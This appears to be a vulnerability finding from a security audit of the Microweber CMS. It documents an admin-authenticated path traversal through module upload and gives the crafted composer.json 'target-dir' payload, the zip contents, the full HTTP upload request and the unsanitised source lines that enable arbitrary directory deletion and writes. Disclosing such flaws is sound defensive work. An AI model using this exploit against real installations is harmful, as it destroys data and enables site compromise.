### F-005: Path Traversal via Module Upload (target-dir in composer.json)
### Severity: HIGH | Auth: Admin | Method: POST (multipart)
### Impact: rmdir_recursive() on arbitrary path, then rename cache dir to attacker-controlled path
### Requires: config('microweber.allow_php_files_upload') = true  OR  default admin upload flow
###
### Step 1: Create malicious zip with crafted composer.json
### (run on attacker machine, then upload via admin panel)
###
### malicious/composer.json content:
###   { "target-dir": "../../malicious_module" }
###
### This causes:
###   rmdir_recursive($modulesPath . '/../../malicious_module')  → deletes arbitrary dir
###   rename($cacheDir, $modulesPath . '/../../malicious_module')  → writes to arbitrary path

POST /api/module-upload/upload HTTP/1.1
Host: localhost:8888
Content-Type: application/x-www-form-urlencoded
Cookie: [ADMIN SESSION COOKIE]
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 42

src=userfiles/tmp/evil_module_uploaded.zip

### Pre-condition: upload the malicious zip via admin file manager first
### ZIP contents:
###   config.php       (empty, just needs to exist)
###   composer.json    { "target-dir": "../../pwned" }
###
### WHY IT WORKS:
###   ModuleUploadController.php:90: rmdir_recursive($modulesPath.'/'.$composerModuleJson['target-dir'])
###   ModuleUploadController.php:94: rename($cacheModuleDir, $modulesPath.'/'.$composerModuleJson['target-dir'])
###   'target-dir' read directly from zip's composer.json — no sanitization
